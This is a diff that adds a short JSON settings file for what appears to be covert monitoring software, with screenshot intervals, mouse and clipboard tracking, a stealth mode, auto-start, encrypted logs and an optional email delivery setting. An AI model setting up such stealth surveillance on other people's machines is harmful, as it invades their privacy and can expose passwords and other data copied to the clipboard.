@@ -1,0 +1,14 @@
+{
+    "screenshot_interval": 300,
+    "track_mouse": true,
+    "track_clipboard": true,
+    "stealth_mode": true,
+    "encrypt_logs": true,
+    "email_enabled": false,
+    "email": "",
+    "password": "",
+    "auto_start": true,
+    "log_retention_days": 30,
+    "screenshot_quality": 80,
+    "hotkey_stop": "ctrl+alt+k"
+}
